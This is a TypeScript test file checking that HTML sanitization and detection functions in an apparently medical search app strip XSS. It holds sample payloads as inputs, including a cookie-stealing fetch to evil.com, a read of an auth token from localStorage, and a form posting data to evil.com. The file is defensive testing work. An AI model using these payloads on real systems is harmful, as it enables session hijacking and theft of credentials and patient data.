import { describe, it, expect } from 'vitest'
import { sanitizeHtml, sanitizeHighlights, containsSuspiciousHtml } from '@/utils/sanitize'

describe('sanitizeHtml', () => {
  it('allows safe mark tags', () => {
    const input = 'Patient <mark>discharged</mark> on 2024-01-15'
    const output = sanitizeHtml(input)
    expect(output).toBe('Patient <mark>discharged</mark> on 2024-01-15')
  })

  it('strips script tags', () => {
    const input = 'Patient <script>alert("XSS")</script> discharged'
    const output = sanitizeHtml(input)
    expect(output).not.toContain('<script>')
    expect(output).toContain('Patient')
    expect(output).toContain('discharged')
  })

  it('strips event handlers', () => {
    const input = '<img src=x onerror="alert(\'XSS\')">'
    const output = sanitizeHtml(input)
    expect(output).not.toContain('onerror')
  })

  it('strips iframe tags', () => {
    const input = '<iframe src="https://evil.com"></iframe>'
    const output = sanitizeHtml(input)
    expect(output).not.toContain('<iframe>')
  })

  it('strips javascript: protocol', () => {
    const input = '<a href="javascript:alert(\'XSS\')">Click</a>'
    const output = sanitizeHtml(input)
    expect(output).not.toContain('javascript:')
  })

  it('keeps text content when stripping tags', () => {
    const input = 'Patient <script>alert("XSS")</script> discharged'
    const output = sanitizeHtml(input)
    expect(output).toBe('Patient  discharged')
  })

  it('handles empty string', () => {
    expect(sanitizeHtml('')).toBe('')
  })

  it('handles null/undefined', () => {
    expect(sanitizeHtml(null as any)).toBe('')
    expect(sanitizeHtml(undefined as any)).toBe('')
  })

  it('allows nested mark tags', () => {
    const input = 'Patient <mark>with <mark>diabetes</mark></mark>'
    const output = sanitizeHtml(input)
    expect(output).toContain('<mark>')
  })

  it('removes all attributes except allowed ones', () => {
    const input = '<mark class="highlight" id="test" data-value="bad">text</mark>'
    const output = sanitizeHtml(input)
    expect(output).toBe('<mark>text</mark>')
  })
})

describe('sanitizeHighlights', () => {
  it('sanitizes all fields in highlights object', () => {
    const input = {
      title: ['Patient <script>alert("XSS")</script> <mark>discharged</mark>'],
      content: ['Test <iframe src="evil"></iframe> <mark>content</mark>']
    }

    const output = sanitizeHighlights(input)

    expect(output.title[0]).not.toContain('<script>')
    expect(output.title[0]).toContain('<mark>discharged</mark>')
    expect(output.content[0]).not.toContain('<iframe>')
    expect(output.content[0]).toContain('<mark>content</mark>')
  })

  it('handles multiple snippets per field', () => {
    const input = {
      content: [
        'First <script>alert(1)</script> snippet',
        'Second <script>alert(2)</script> snippet'
      ]
    }

    const output = sanitizeHighlights(input)

    expect(output.content).toHaveLength(2)
    expect(output.content[0]).not.toContain('<script>')
    expect(output.content[1]).not.toContain('<script>')
  })

  it('handles empty highlights object', () => {
    expect(sanitizeHighlights({})).toEqual({})
  })

  it('handles null/undefined', () => {
    expect(sanitizeHighlights(null as any)).toEqual({})
    expect(sanitizeHighlights(undefined as any)).toEqual({})
  })
})

describe('containsSuspiciousHtml', () => {
  it('detects script tags', () => {
    expect(containsSuspiciousHtml('<script>alert("XSS")</script>')).toBe(true)
    expect(containsSuspiciousHtml('<SCRIPT>alert("XSS")</SCRIPT>')).toBe(true)
  })

  it('detects javascript: protocol', () => {
    expect(containsSuspiciousHtml('javascript:alert("XSS")')).toBe(true)
    expect(containsSuspiciousHtml('JAVASCRIPT:alert("XSS")')).toBe(true)
  })

  it('detects event handlers', () => {
    expect(containsSuspiciousHtml('<img onerror="alert(1)">')).toBe(true)
    expect(containsSuspiciousHtml('<div onclick="alert(1)">')).toBe(true)
    expect(containsSuspiciousHtml('<body onload="alert(1)">')).toBe(true)
  })

  it('detects iframe tags', () => {
    expect(containsSuspiciousHtml('<iframe src="evil"></iframe>')).toBe(true)
  })

  it('detects object/embed tags', () => {
    expect(containsSuspiciousHtml('<object data="evil"></object>')).toBe(true)
    expect(containsSuspiciousHtml('<embed src="evil">')).toBe(true)
  })

  it('detects data: protocol with HTML', () => {
    expect(containsSuspiciousHtml('data:text/html,<script>alert(1)</script>')).toBe(true)
  })

  it('returns false for safe HTML', () => {
    expect(containsSuspiciousHtml('Patient <mark>discharged</mark>')).toBe(false)
    expect(containsSuspiciousHtml('Normal text')).toBe(false)
  })

  it('handles empty/null input', () => {
    expect(containsSuspiciousHtml('')).toBe(false)
    expect(containsSuspiciousHtml(null as any)).toBe(false)
  })
})

describe('XSS Attack Scenarios', () => {
  it('prevents session hijacking attack', () => {
    const malicious = `<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">`
    const sanitized = sanitizeHtml(malicious)
    expect(sanitized).not.toContain('onerror')
    expect(sanitized).not.toContain('fetch')
  })

  it('prevents DOM manipulation attack', () => {
    const malicious = '<script>document.body.innerHTML = "Hacked!"</script>'
    const sanitized = sanitizeHtml(malicious)
    expect(sanitized).not.toContain('<script>')
    expect(sanitized).not.toContain('innerHTML')
  })

  it('prevents credential theft attack', () => {
    const malicious = '<img src=x onerror="alert(localStorage.getItem(\'auth_token\'))">'
    const sanitized = sanitizeHtml(malicious)
    expect(sanitized).not.toContain('onerror')
    expect(sanitized).not.toContain('localStorage')
  })

  it('prevents data exfiltration via form submission', () => {
    const malicious = '<form action="https://evil.com" method="POST"><input name="data" value="PHI"></form>'
    const sanitized = sanitizeHtml(malicious)
    expect(sanitized).not.toContain('<form>')
    expect(sanitized).not.toContain('action')
  })
})
